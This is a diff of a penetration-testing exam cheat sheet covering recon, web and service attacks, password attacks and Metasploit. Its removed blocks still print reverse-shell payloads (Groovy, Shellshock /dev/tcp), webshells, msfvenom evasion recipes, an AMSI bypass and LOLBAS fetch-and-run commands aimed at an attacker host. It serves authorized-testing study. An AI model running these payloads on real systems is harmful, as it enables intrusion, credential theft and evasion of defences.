@@ -40,175 +40,17 @@
   ```
 
 ### 0.2 Environment Type — pick a Track and stick to it
-- IF a single AD/Windows DC is in scope → **Track A — Active Directory** (Sections 2.2 SMB/LDAP/Kerberos → 7 → 8).
-- IF a Linux web server / standalone Linux box → **Track B — Standalone Linux** (Sections 2 → 3 → 4.1 → 5).
-- IF a standalone Windows box without domain → **Track C — Standalone Windows** (Sections 2 → 4.2 → 6).
-- IF web app only → **Track D — Web** (Sections 2.3 → 3 → 4.1).
-- IF mixed internal network → **Track E — Enterprise**: External recon → web foothold → pivot (9) → AD (7).
+- IF a single AD/Windows DC is in scope → **Track A — Active Directory** (Sections 1.2 SMB/LDAP/Kerberos → 6 → 7).
+- IF a Linux web server / standalone Linux box → **Track B — Standalone Linux** (Sections 1 → 2 → 3.1 → 4).
+- IF a standalone Windows box without domain → **Track C — Standalone Windows** (Sections 1 → 3.2 → 5).
+- IF web app only → **Track D — Web** (Sections 1.3 → 2 → 3.1).
+- IF mixed internal network → **Track E — Enterprise**: External recon → web foothold → pivot (8) → AD (6).
 
 ---
 
----
+## 1. Reconnaissance & Enumeration
 
-## 1. Pentest Process Stages (the path framework)
-
-```
-┌──────────────────────────────────────────────────────────────┐
-│ 1. Pre-Engagement                                            │
-│    - Scoping questionnaire, NDA, ROE, kickoff meeting        │
-│    - Test windows agreed, emergency contacts, IPs whitelisted│
-├──────────────────────────────────────────────────────────────┤
-│ 2. Information Gathering                                     │
-│    - OSINT (whois, DNS, CT logs, search dorks, wayback)      │
-│    - Active recon (port scan, banners, vhosts)               │
-├──────────────────────────────────────────────────────────────┤
-│ 3. Vulnerability Assessment                                  │
-│    - Manual + automated identification                       │
-│    - Prioritise by CVSS + business context                   │
-├──────────────────────────────────────────────────────────────┤
-│ 4. Exploitation                                              │
-│    - Initial foothold (web/service exploit)                  │
-│    - Privilege escalation (local)                            │
-├──────────────────────────────────────────────────────────────┤
-│ 5. Post-Exploitation                                         │
-│    - Pillaging (creds, configs, sensitive data)              │
-│    - Persistence (only if scope allows)                      │
-│    - Internal recon                                          │
-├──────────────────────────────────────────────────────────────┤
-│ 6. Lateral Movement                                          │
-│    - Pivot, repeat 2-5 in deeper segments                    │
-│    - Build attack chain to objective (DA, PII, etc.)         │
-├──────────────────────────────────────────────────────────────┤
-│ 7. Proof-of-Concept                                          │
-│    - Capture screenshots, flags, evidence                    │
-├──────────────────────────────────────────────────────────────┤
-│ 8. Post-Engagement                                           │
-│    - Cleanup, retest, deliverables, debrief                  │
-└──────────────────────────────────────────────────────────────┘
-```
-
-The CPTS exam tests stages 2-7 + reporting. Always know which stage you're in and don't skip ahead — most stuck moments come from skipping enumeration to jump to exploitation.
-
-### 1.1 Pre-Engagement scoping items (the questionnaire)
-
-- Type of test (black/grey/white box)
-- Targets (IPs/CIDRs/URLs/Domains)
-- Out-of-scope items (production DB, customer data, third-party hosts)
-- Test windows (business hours? after hours?)
-- Allowed techniques (DoS? social engineering? phishing?)
-- Credentials provided?
-- Reporting deliverables (draft, final, executive)
-- Emergency contact (24/7 escalation)
-- Evidence handling / data retention rules
-
-### 1.2 Laws & ethics — you MUST stay in scope
-
-- CFAA (US), Computer Misuse Act (UK), Section 66 IT Act (India), GDPR (EU).
-- If you find something out of scope by accident → stop, document, ask the client before continuing.
-
----
-
----
-
-## 2. Reconnaissance & Enumeration
-
-
-### 2.0 Web OSINT / External Recon
-
-#### 2.0.1 WHOIS
-
-```bash
-whois <domain>                                  # registrar, abuse contact
-whois <ip>                                      # network owner / ASN
-curl -s "https://rdap.org/domain/<domain>" | jq
-```
-
-#### 2.0.2 DNS recon (full)
-
-```bash
-dig +short A     <domain>
-dig +short MX    <domain>
-dig +short NS    <domain>
-dig +short TXT   <domain>
-dig +short CNAME www.<domain>
-
-dnsrecon -d <domain> -t std,brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -j dnsrecon.json
-
-amass enum -d <domain> -o amass.txt
-subfinder -d <domain> -all -recursive -o subfinder.txt
-assetfinder --subs-only <domain> | tee assetfinder.txt
-findomain -t <domain>
-cat amass.txt subfinder.txt assetfinder.txt | sort -u > subs.txt
-
-dnsx -l subs.txt -resp -o resolved.txt
-httpx -l subs.txt -threads 50 -title -tech-detect -status-code -o httpx.txt
-```
-
-#### 2.0.3 Certificate Transparency
-
-```bash
-curl -s "https://crt.sh/?q=%25.<domain>&output=json" | jq -r '.[].name_value' | sort -u
-cero <ip-or-host>                                # pulls SAN from cert
-```
-
-#### 2.0.4 Robots.txt / sitemap / well-known
-
-```bash
-curl -s http://<h>/robots.txt
-curl -s http://<h>/sitemap.xml
-curl -s http://<h>/.well-known/
-# /.well-known/security.txt
-# /.well-known/openid-configuration   (OIDC issuer details)
-# /.well-known/jwks.json              (signing keys)
-# /.well-known/change-password
-```
-
-#### 2.0.5 Wayback Machine / archive
-
-```bash
-curl -s "http://web.archive.org/cdx/search/cdx?url=*.<domain>/*&output=text&fl=original&collapse=urlkey" \
-  | sort -u > wayback.txt
-echo <domain> | gau --threads 5 > urls.txt
-grep -E "\?" urls.txt | qsreplace FUZZ > params.txt
-```
-
-#### 2.0.6 Search engine dorking
-
-```text
-site:<domain>                                  → indexed pages
-site:<domain> -www                              → drop main site
-site:<domain> ext:pdf|doc|xls|sql|env|log
-site:<domain> intext:"index of /"
-site:<domain> intitle:"login"
-site:<domain> inurl:"admin"
-site:github.com "<domain>" password
-site:stackoverflow.com "<domain>"
-site:pastebin.com "<domain>"
-"<company>" filetype:env "DB_PASSWORD"
-```
-
-#### 2.0.7 Recon frameworks
-
-```bash
-theHarvester -d <domain> -b all -f harvester
-spiderfoot -l 127.0.0.1:5001
-finalrecon --headers --crawl --whois --dns -u http://<h>
-```
-
-#### 2.0.8 Crawling & JS analysis
-
-```bash
-katana -u http://<h>/ -d 5 -jc -o crawl.txt
-hakrawler -u http://<h>/ -d 5
-gospider -s http://<h>/ -t 20 -c 10 -d 4 -o gospider/
-
-# JS file analysis
-linkfinder.py -i http://<h>/static/js/main.js -o cli
-```
-
----
-
-### 2.1 Network Enumeration (Nmap)
+### 1.1 Network Enumeration (Nmap)
 
 ```bash
 # Always: keep all output in three formats
@@ -239,7 +81,7 @@ mkdir -p nmap && cd nmap
   sudo nmap -sV -sC -iL live.txt -oA services-top1000
   ```
 
-  > 🔄 **LOOP — New host discovered**: Add to your host list. Run this §2.1 scan sequence against it. Add hostname to `/etc/hosts`. Then §2.2 per-service enum on every open port.
+  > 🔄 **LOOP — New host discovered**: Add to your host list. Run this §1.1 scan sequence against it. Add hostname to `/etc/hosts`. Then §1.2 per-service enum on every open port.
 
 - IF **ICMP is blocked** (no replies even to live hosts):
   ```bash
@@ -275,9 +117,9 @@ mkdir -p nmap && cd nmap
   # Example: searchsploit "vsftpd 2.3.4"  searchsploit "OpenSSH 7.2"
   searchsploit -m <edb-id>         # copy to current dir
   ```
-  (see §3 for full vulnerability workflow)
+  (see §2 for full vulnerability workflow)
 
-### 2.2 Service-Specific Enumeration
+### 1.2 Service-Specific Enumeration
 
 For each port number, follow the tree top-to-bottom, stopping when you find foothold-quality info.
 
@@ -316,13 +158,13 @@ For each port number, follow the tree top-to-bottom, stopping when you find foot
   ```bash
   python3 sshUserEnum.py --port 22 --userList /usr/share/seclists/Usernames/top-usernames-shortlist.txt <ip>
   ```
-- IF login form (creds gathered later) → §4.3 password attacks (hydra).
+- IF login form (creds gathered later) → §3.3 password attacks (hydra).
 - IF you have a private key:
   ```bash
   chmod 600 id_rsa
   ssh -i id_rsa -o IdentitiesOnly=yes user@<ip>
   ```
-- IF the key is encrypted → §4.3 (`ssh2john id_rsa > h && john --wordlist=rockyou.txt h`).
+- IF the key is encrypted → §3.3 (`ssh2john id_rsa > h && john --wordlist=rockyou.txt h`).
 
 #### SMTP — 25 / 465 / 587
 
@@ -350,7 +192,7 @@ dig axfr @<ip> <domain>                    # zone transfer
 dig axfr @<ip> $(dig +short ns <domain> | head -1)
 ```
 - IF AXFR succeeds → goldmine — harvests every subdomain, cnames, MX, internal IPs.
-- IF AXFR refused → subdomain bruteforce (see §2.3):
+- IF AXFR refused → subdomain bruteforce (see §1.3):
   ```bash
   ffuf -u "http://FUZZ.<domain>/" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -mc 200,301,302
   # Or
@@ -373,7 +215,7 @@ dig axfr @<ip> $(dig +short ns <domain> | head -1)
   wappalyzer-cli http://<ip>          # if installed
   nikto -h http://<ip> -o nikto.txt
   ```
-- See §2.3 below for the full web tree.
+- See §1.3 below for the full web tree.
 
 #### SMB — 139 / 445
 
@@ -405,8 +247,8 @@ dig axfr @<ip> $(dig +short ns <domain> | head -1)
   grep -r cpassword .
   gpp-decrypt '<cpassword-blob>'
   ```
-  > 🔄 **LOOP — GPP/share creds found**: Return to §4.3 "Got Creds" spray tree → test against ALL hosts/services
-- IF **SMB signing is OFF** → relay candidate (note for §7 ADCS / §4.3):
+  > 🔄 **LOOP — GPP/share creds found**: Return to §3.3 "Got Creds" spray tree → test against ALL hosts/services
+- IF **SMB signing is OFF** → relay candidate (note for §6 ADCS / §3.3):
   ```bash
   nxc smb <cidr> --gen-relay-list relay.txt
   ```
@@ -505,7 +347,7 @@ mssqlclient.py <user>:'<pass>'@<ip>                   # SQL auth
    WHERE a.permission_name='IMPERSONATE';
   EXECUTE AS LOGIN='sa'; SELECT system_user;
   ```
-- IF NTLM hash captured → relay (see §7 ADCS) or crack (`hashcat -m 5600` for NetNTLMv2).
+- IF NTLM hash captured → relay (see §6 ADCS) or crack (`hashcat -m 5600` for NetNTLMv2).
 
 #### MySQL — 3306/tcp
 
@@ -531,7 +373,7 @@ sudo nmap -p111,2049 --script nfs-ls,nfs-statfs,nfs-showmount <ip>
 showmount -e <ip>
 sudo mkdir -p /mnt/nfs && sudo mount -t nfs -o vers=3 <ip>:/<export> /mnt/nfs
 ```
-- IF `no_root_squash` set → mount, drop a SUID binary (covered in §5.2).
+- IF `no_root_squash` set → mount, drop a SUID binary (covered in §4.2).
 - IF UID-based access → `sudo useradd -u <uid> tmpuser; sudo -u tmpuser ls /mnt/nfs`.
 
 #### TFTP — 69/udp
@@ -650,7 +492,7 @@ snmp-check <ip> -c public
   ```
 - IF still unknown → google the port number + `default service`. Check for IoT/embedded admin panels.
 
-### 2.3 Web Application Enumeration
+### 1.3 Web Application Enumeration
 
 #### Step 1 — Footprint
 ```bash
@@ -719,7 +561,7 @@ gobuster dir -u http://<host>/ -w /usr/share/seclists/Discovery/Web-Content/big.
   ```
   Then add discovered host to `/etc/hosts`.
 
-  > 🔄 **LOOP — New vhost/subdomain found**: Add to `/etc/hosts`, then restart §2.3 web enum from Step 1 for the new vhost. Different vhost = different attack surface.
+  > 🔄 **LOOP — New vhost/subdomain found**: Add to `/etc/hosts`, then restart §1.3 web enum from Step 1 for the new vhost. Different vhost = different attack surface.
 
 #### Step 5 — Parameter Discovery
 ```bash
@@ -782,86 +624,9 @@ curl -X OPTIONS http://<host>/api/users -i
 - IF Jenkins → /script (Groovy console) for RCE if creds.
 - IF Splunk → upload malicious app for RCE if admin.
 
-
-### 2.4 Burp Suite / ZAP (Proxy Workflow)
-
-#### 2.4.1 First-time setup
-
-```text
-1) Burp → Proxy → Options → Intercept Off
-2) Browser → set proxy 127.0.0.1:8080 (or use Burp's embedded Chromium)
-3) Visit http://burp → Download CA cert → import into browser as Trusted Root
-4) Set Target → Scope → only your in-scope domains/IPs
-```
-
-#### 2.4.2 Manual testing flow
-
-```text
-Proxy → click through entire app                    (populates Target)
-Target → Scope → tick "Show only in-scope items"
-Target → Site map → right-click each interesting request → "Send to Repeater"
-Repeater → modify each parameter / header / method
-For complex iteration → "Send to Intruder"
-```
-
-#### 2.4.3 Burp Intruder — 4 attack types
-
-| Attack type | Payload sets | Use case |
-| --- | --- | --- |
-| **Sniper** | 1 set, hits one position at a time | Test each parameter individually |
-| **Battering Ram** | 1 set, same value all positions | Same value in multiple places |
-| **Pitchfork** | 1 set per position, parallel | Username:Password pairing |
-| **Cluster Bomb** | 1 set per position, cartesian | User × Password permutations |
-
-```text
-1) Send request to Intruder
-2) Clear payload positions; mark only the field(s) to fuzz with §
-3) Pick attack type
-4) Payloads tab → load wordlist
-5) Settings → Grep – Match → "incorrect" / "invalid" to filter
-6) Start Attack → sort by Length / Status
-```
-
-#### 2.4.4 Match & Replace (auto-modification)
-
-```text
-Proxy → Match and Replace → Add rule:
-  - Match: User-Agent regex
-  - Replace: New UA / SQLi probe / XSS canary
-Apply to: requests
-```
-
-#### 2.4.5 Burp Scanner (Pro) / ZAP equivalent
-
-```text
-Burp:  Crawl (Spider) → Active Scan → Issues → Report
-ZAP:   Spider → Active Scan → Alerts → Report
-```
-
-#### 2.4.6 ZAP Fuzzer (free Intruder alternative)
-
-```text
-1) Right-click request in History → Attack → Fuzz
-2) Add Locations (the fields)
-3) Add Payloads (file/strings/script)
-4) Optional Processors (URL encode, base64)
-5) Start → Sort by Code/Size/Time
-```
-
-#### 2.4.7 Useful BApp / ZAP add-ons
-
-- **Logger++** — full request log with regex search
-- **Autorize** — IDOR / authorization checking
-- **Param Miner** — hidden parameter discovery
-- **Hackvertor** — fast encoding/transformation
-- **Active Scan++** — extra scan checks
-- **Collaborator** (Pro) / OAST Server — OOB testing
-
 ---
 
----
-
-## 3. Vulnerability Identification
+## 2. Vulnerability Identification
 
 Decision tree:
 
@@ -882,13 +647,13 @@ Decision tree:
     ```
   - Burp scanner Active scan only on authorised endpoints.
 
-- IF AD environment → see §7.1 + automated:
+- IF AD environment → see §6.1 + automated:
   ```bash
   nxc ldap <dc-ip> -u <u> -p <p> --asreproast asrep.txt --kerberoasting kerb.txt
   bloodhound-python -d <dom> -u <u> -p <p> -ns <dc-ip> -c All --zip
   ```
 
-- IF credentials found → run the **Credential Spray Matrix** (§4.3) against every host:
+- IF credentials found → run the **Credential Spray Matrix** (§3.3) against every host:
   ```bash
   nxc smb     <cidr> -u <u> -p '<p>'
   nxc winrm   <cidr> -u <u> -p '<p>'
@@ -905,66 +670,11 @@ Decision tree:
   - **searchsploit / exploit-db** — for known service versions.
   - **nuclei** — fast first-pass against web hosts (low risk).
 
-
-### 3.5 Vulnerability Assessment Workflow
-
-#### 3.5.1 CVSS Scoring (do this for every finding)
-
-Use https://www.first.org/cvss/calculator/3.1 — never invent scores.
-
-| Finding | Typical CVSSv3.1 base |
-| --- | --- |
-| Default creds + RCE | 9.8 (Critical) |
-| Unauth RCE | 9.8 |
-| Auth RCE | 8.8 |
-| SQLi unauth | 9.8 |
-| SQLi auth | 8.8 |
-| Directory listing | 5.3 |
-| Info disclosure (config) | 5.3 |
-| Outdated software w/ known CVE | varies |
-| Missing security headers | 4.3 |
-| Self-XSS | 3.5 |
-| Stored XSS | 6.1 |
-
-#### 3.5.2 Nessus workflow
-
-```text
-1) /etc/init.d/nessusd start → https://localhost:8834
-2) Policies → New Policy → "Advanced Scan"
-   - Discovery → custom port range "1-65535"
-   - Assessment → enable web app tests, thorough tests
-   - Credentials → SSH/Windows for authenticated scan (much higher signal)
-3) Scans → New Scan → use the policy → set Targets
-4) Launch → wait
-5) Export → HTML for client; Nessus DB for re-import; CSV for triage
-6) Triage findings: read plugin output details to dismiss false positives
-```
-
-#### 3.5.3 OpenVAS / GVM workflow
-
-```bash
-sudo gvm-setup           # one-time
-sudo gvm-start
-# Web UI: https://127.0.0.1:9392
-# Configuration → Targets → New (specify hosts)
-# Scans → Tasks → New (pick target + scan config "Full and Fast")
-# Run → Reports
-```
-
-#### 3.5.4 Manual prioritisation checklist (in lieu of vuln scanner)
-
-- Critical → unauth RCE / SQLi / file upload to RCE
-- High → auth RCE / DCSync prerequisites / weak creds on admin endpoints
-- Medium → IDOR / XXE / SSRF / outdated software (no PoC)
-- Low → info leaks / missing headers / verbose errors
-
 ---
 
----
+## 3. Initial Access / Exploitation
 
-## 4. Initial Access / Exploitation
-
-### 4.1 Web Application Attacks
+### 3.1 Web Application Attacks
 
 #### SQL Injection
 
@@ -1250,209 +960,7 @@ Detection: any XML-accepting endpoint (SOAP, SAML, OOXML upload, RSS feeds, XML 
   ffuf -u "http://<host>/api/user/FUZZ/profile" -w <(seq 1 5000) -mc 200 -fs <baseline> -H "Authorization: Bearer <token>"
   ```
 
-
-#### 4.1.A Application-Specific Attack Trees
-
-##### 13.1 WordPress
-
-#### Discovery
-- IF `wp-login.php`, `wp-content/`, `wp-` cookies visible → confirmed.
-- Version: `curl -s http://<h>/ | grep -oP 'content="WordPress \K[0-9.]+'` or wpscan.
-
-#### Enumeration
-```bash
-wpscan --url http://<h>/ --enumerate u,vp,vt,cb,dbe,m -e u1-50 \
-       --api-token <token> --random-user-agent --plugins-detection aggressive -o wpscan.txt
-# User enum (via author scan even if hidden)
-curl -s "http://<h>/?author=1" -I | grep -i location          # /author/<username>
-curl -s "http://<h>/wp-json/wp/v2/users"                       # REST API user list
-```
-
-#### Attack Decision Tree
-- IF default/weak admin creds → wp-login bruteforce:
-  ```bash
-  wpscan --url http://<h>/ --usernames admin,wordpress --passwords rockyou.txt --max-threads 20
-  hydra -L users.txt -P rockyou.txt <h> http-post-form \
-        '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect' -t 10
-  ```
-- IF admin shell → edit theme:
-  ```text
-  Appearance → Theme Editor → Pick the active theme → Edit 404.php
-  Replace contents with: <?php system($_GET['c']); ?>
-  Visit: http://<h>/wp-content/themes/<theme>/404.php?c=id
-  ```
-- IF outdated plugin with known RCE → metasploit:
-  ```bash
-  msfconsole -qx "search type:exploit wordpress"
-  ```
-- High-impact CVEs to check: WP File Manager (CVE-2020-25213), WP GDPR (CVE-2018-19207), Duplicator (CVE-2020-11738), various RCE plugins.
-
-##### 13.2 Joomla
-
-```bash
-curl -s http://<h>/administrator/manifests/files/joomla.xml | grep version
-curl -s http://<h>/language/en-GB/en-GB.xml | grep version
-joomscan -u http://<h>/
-droopescan scan joomla -u http://<h>/
-```
-- IF admin login → Templates → edit error.php / index.php → drop webshell.
-- CVEs: CVE-2017-8917 (SQLi unauth), CVE-2019-10945 (auth dir traversal), CVE-2023-23752 (unauth API config disclosure).
-
-##### 13.3 Drupal
-
-```bash
-droopescan scan drupal -u http://<h>/
-curl -s http://<h>/CHANGELOG.txt | head
-# IF Drupal < 7.58 / 8.5.1 → Drupalgeddon2 (CVE-2018-7600)
-msfconsole -qx "use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS <h>; run"
-```
-- IF authenticated as admin: Modules → enable PHP filter (Drupal ≤ 7) → create page with PHP. Newer Drupal: upload backdoored module via Modules → Install.
-
-##### 13.4 Tomcat
-
-```bash
-# Version
-curl -s -i http://<h>:8080/ | grep -i 'Server:'
-curl -s http://<h>:8080/docs/                    # /docs reveals version
-# Default creds — try in order
-curl -i -u tomcat:tomcat   http://<h>:8080/manager/html
-curl -i -u admin:admin     http://<h>:8080/manager/html
-curl -i -u tomcat:s3cret   http://<h>:8080/manager/html
-# Brute-force
-hydra -L users.txt -P passwords.txt <h> -s 8080 http-get /manager/html
-
-# Deploy WAR shell after creds
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<lh> LPORT=4444 -f war > sh.war
-curl -u tomcat:<p> --upload-file sh.war "http://<h>:8080/manager/text/deploy?path=/sh"
-curl http://<h>:8080/sh/
-
-# Ghostcat (CVE-2020-1938) on AJP port 8009
-sudo nmap -p8009 --script ajp-* <h>
-python3 ajpShooter.py http://<h>:8080 8009 /WEB-INF/web.xml read
-
-# Tomcat CGI Shellshock — when /cgi/<*.bat|*.sh> accessible:
-curl -i -A "() { :;}; echo;/bin/cat /etc/passwd" http://<h>:8080/cgi/<script>.sh
-```
-
-##### 13.5 Jenkins
-
-```bash
-# Version visible at http://<h>:8080/
-# Default creds: admin/admin, jenkins/jenkins
-# IF /signup enabled → register
-# IF /script accessible → instant Groovy RCE
-curl -u admin:admin --data-urlencode "script=def proc='id'.execute(); proc.waitFor(); println proc.in.text" \
-  http://<h>:8080/scriptText
-```
-Reverse shell Groovy payload (paste in Script Console):
-```groovy
-String host="<lh>";int port=4444;String cmd="/bin/bash";
-Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
-Socket s=new Socket(host,port);
-InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
-OutputStream po=p.getOutputStream(),so=s.getOutputStream();
-while(!s.isClosed()){
- while(pi.available()>0)so.write(pi.read());
- while(pe.available()>0)so.write(pe.read());
- while(si.available()>0)po.write(si.read());
- so.flush();po.flush();Thread.sleep(50);
- try{p.exitValue();break;}catch(Exception e){}
-};p.destroy();s.close();
-```
-
-##### 13.6 Splunk
-
-```bash
-# Default creds: admin / changeme  OR  admin / SplunkAdmin
-# Auth → upload malicious app for RCE
-# Build Splunk app with bin/run.py revshell, upload via Settings → Apps
-msfconsole -qx "use exploit/multi/http/splunk_upload_app_exec; set RHOSTS <h>; ..."
-```
-
-##### 13.7 PRTG Network Monitor
-
-- Default creds: `prtgadmin / prtgadmin` (web 8080/443).
-- Authenticated → Notifications → add EXE notification → triggers as SYSTEM.
-- CVE-2018-9276: authenticated command injection in Notification.
-
-##### 13.8 osTicket
-
-- Look for sensitive data in attachments / tickets (clients often submit creds).
-- Username enum via "forgot password" responses.
-
-##### 13.9 GitLab
-
-```bash
-curl -s http://<h>/help | grep -oP 'GitLab \w+ v\K[0-9.]+'
-curl -s http://<h>/api/v4/version
-# Username enum
-curl -s "http://<h>/api/v4/users?username=admin"
-# IF signup enabled → register
-# CVEs:
-# - CVE-2021-22205 (unauth RCE via ExifTool) ≤ 13.10.3
-# - CVE-2022-2884 (auth import RCE)
-# - CVE-2023-7028 (account takeover via password reset to attacker email)
-```
-
-##### 13.10 ColdFusion
-
-```bash
-curl -i http://<h>/CFIDE/administrator/index.cfm
-# Default admin: admin / admin
-# CVE-2010-2861 dir traversal:
-curl "http://<h>:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../ColdFusion8/lib/password.properties%00en"
-# CVE-2017-3066 — Java deserialization (Flex AMF)
-# Once admin → Scheduled Tasks → run a CFM file → RCE
-```
-
-##### 13.11 IIS — Tilde (8.3) Enumeration
-
-```bash
-python3 IIS_shortname_Scanner.py http://<h>
-sudo nmap --script http-iis-short-name-brute -p80 <h>
-```
-
-##### 13.12 LDAP Injection (application-level)
-
-- Login bypass payloads:
-  ```
-  *)(uid=*))(|(uid=*
-  *)(&)
-  ```
-- Boolean extraction: `*)(cn=a*)`, `*)(cn=b*)` — narrow per char.
-
-##### 13.13 Web Mass Assignment
-
-```bash
-curl -X PUT http://<h>/api/users/me -H "Content-Type: application/json" \
-     -d '{"name":"john","email":"j@x.io","is_admin":true}'
-```
-- Common vulnerable fields: `role`, `isAdmin`, `is_active`, `verified`, `balance`, `owner`, `tenant_id`.
-
-##### 13.14 Shellshock (CVE-2014-6271) on CGI
-
-```bash
-curl -A "() { :;}; echo; echo VULN" http://<h>/cgi-bin/test.sh
-curl -A "() { :;}; /bin/bash -i >& /dev/tcp/<lh>/4444 0>&1" http://<h>/cgi-bin/<script>
-# Try as User-Agent, Cookie, Referer, Host headers
-```
-
-##### 13.15 Thick-Client Applications
-
-```bash
-file <binary>
-strings -a <binary> | grep -iE 'pass|key|http|sql'
-strings -el <binary>                                     # 16-bit unicode
-# .NET → dnSpy / ILSpy
-# Java → jadx-gui app.jar
-# Native → Ghidra / IDA
-# Hunt for: hardcoded creds, internal endpoints, hidden URLs, custom protocols
-# Then test the back-end API / RPC just like any web target
-```
-
----
-
-### 4.2 Service Exploitation
+### 3.2 Service Exploitation
 
 - IF SSH + creds:
   ```bash
@@ -1488,7 +996,7 @@ strings -el <binary>                                     # 16-bit unicode
   nxc smb <ip> -u <u> -H <NTLM>
   ```
 
-- IF MSSQL — see §2.2 → enable xp_cmdshell or abuse linked servers.
+- IF MSSQL — see §1.2 → enable xp_cmdshell or abuse linked servers.
 
 - IF outdated service with public exploit:
   ```bash
@@ -1508,7 +1016,7 @@ strings -el <binary>                                     # 16-bit unicode
   showmount -e <ip> && sudo mount -t nfs <ip>:/<share> /mnt/nfs
   ```
 
-### 4.3 Password Attacks
+### 3.3 Password Attacks
 
 #### Hash workflow
 
@@ -1629,8 +1137,8 @@ Hash spray (PTH — no lockout risk for NTLM PTH):
   nxc smb <cidr> -u <u> -H <NTLM> --continue-on-success
 ```
 
-> 🔄 **LOOP**: Spray hits new host → go to §5 (Linux post-ex) or §6 (Windows post-ex) on that host
-> 🔄 **LOOP**: New domain user creds → return to §7.1 AD Enumeration with those creds
+> 🔄 **LOOP**: Spray hits new host → go to §4 (Linux post-ex) or §5 (Windows post-ex) on that host
+> 🔄 **LOOP**: New domain user creds → return to §6.1 AD Enumeration with those creds
 > 🔄 **LOOP**: Creds work on DC → re-run BloodHound, re-run Kerberoast/AS-REP with new context
 
 #### Login form / service brute-force
@@ -1731,153 +1239,13 @@ Run this against **every host** every time you find a new credential.
   2. `T0XlC.rule` / `dive.rule` — moderate
   3. `OneRuleToRuleThemAll.rule` — heavy, save for hard hashes
 
-
-### 4.4 Metasploit Framework
-
-#### 4.4.1 Boot & search
-
-```bash
-sudo systemctl start postgresql
-msfdb init
-msfconsole -q
-msf6> db_status
-msf6> workspace -a exam-2025
-msf6> db_nmap -sV -p- 10.10.10.0/24                # auto-imports
-msf6> hosts; services; vulns
-msf6> search type:exploit ms17-010
-```
-
-#### 4.4.2 Module workflow
-
-```text
-use exploit/windows/smb/ms17_010_eternalblue
-info
-options                              # show RHOSTS, LHOST, etc.
-set RHOSTS 10.10.10.5
-set LHOST tun0
-set PAYLOAD windows/x64/meterpreter/reverse_https
-set LPORT 443
-check                                # safety check
-exploit -j                           # background as a job
-sessions -l
-sessions -i 1
-```
-
-#### 4.4.3 Common payloads
-
-| Payload | When |
-| --- | --- |
-| `windows/x64/meterpreter/reverse_https` | best stealth on outbound 443 |
-| `windows/x64/meterpreter/reverse_tcp` | simple, common |
-| `linux/x64/meterpreter/reverse_tcp` | Linux meterpreter |
-| `cmd/unix/reverse_bash` | minimalist, bash-only |
-| `python/meterpreter/reverse_tcp` | Linux, Python only |
-| `windows/x64/shell_reverse_tcp` | when meterpreter is too noisy |
-| `java/jsp_shell_reverse_tcp` | Tomcat WAR |
-
-#### 4.4.4 msfvenom recipes
-
-```bash
-# Windows EXE
-msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<lh> LPORT=443 -f exe -o sh.exe
-# Windows DLL
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<lh> LPORT=4444 -f dll -o sh.dll
-# Linux ELF
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=<lh> LPORT=4444 -f elf -o sh
-# PowerShell base64
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lh> LPORT=4444 -f psh-cmd -o sh.cmd
-# ASPX
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lh> LPORT=4444 -f aspx -o sh.aspx
-# WAR
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<lh> LPORT=4444 -f war -o sh.war
-# Stageless (one-shot, larger but no second connection)
-msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<lh> LPORT=443 -f exe -o sh.exe
-# Encoded — x86 (shikata_ga_nai, most iterations = more evasion, larger file)
-msfvenom -p windows/x86/shell_reverse_tcp LHOST=<lh> LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o sh.exe
-# Encoded — x64
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lh> LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o sh.exe
-# Fileless — IEX DownloadString (no disk write)
-msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<lh> LPORT=443 -f psh -o payload.ps1
-# Then: iex (iwr http://<lh>/payload.ps1 -UseBasicParsing).Content
-```
-
-#### AV / AMSI Evasion Quick-Reference
-
-```powershell
-# AMSI bypass (run before any offensive PS import)
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-
-# Bypass PS execution policy
-powershell -ep bypass -c "<command>"
-powershell -exec bypass -enc <base64-command>
-
-# AppLocker bypass (write to allowed paths)
-# Allowed by default: C:\Windows\Temp\, C:\Windows\System32\spool\drivers\color\
-copy payload.exe C:\Windows\System32\spool\drivers\color\payload.exe
-
-# PS v2 downgrade (bypasses AMSI/ScriptBlock logging on old systems)
-powershell -Version 2 -c "<command>"
-
-# LOLBAS alternatives when exe blocked (no disk):
-rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell");h.run("calc");
-regsvr32 /s /n /u /i:http://<lh>/payload.sct scrobj.dll
-mshta http://<lh>/payload.hta
-```
-
-#### 4.4.5 Multi/handler
-
-```text
-use exploit/multi/handler
-set PAYLOAD <same payload as msfvenom>
-set LHOST tun0
-set LPORT 443
-set ExitOnSession false
-exploit -j
-```
-
-#### 4.4.6 Meterpreter post-ex
-
-```text
-sysinfo                          # OS, arch
-getuid                           # current user
-getsystem                        # try LSA / SeImpersonate / KiTrap0D
-hashdump                         # local SAM (need SYSTEM)
-load kiwi                        # mimikatz module
-kiwi> creds_all
-load incognito                   # token impersonation
-list_tokens -u
-impersonate_token "DOMAIN\\admin"
-ps                                # processes
-migrate <pid>                    # move into another process
-shell                             # native shell
-download / upload                # file transfer
-portfwd add -l 1234 -p 3389 -r 10.10.10.5     # forward through session
-run autoroute -s 10.10.10.0/24                # add route through session
-run post/multi/recon/local_exploit_suggester  # next-step ideas
-```
-
-#### 4.4.7 Pivoting via Metasploit (full)
-
-```text
-sessions -i 1
-meterpreter > run autoroute -s 10.10.10.0/24
-meterpreter > background
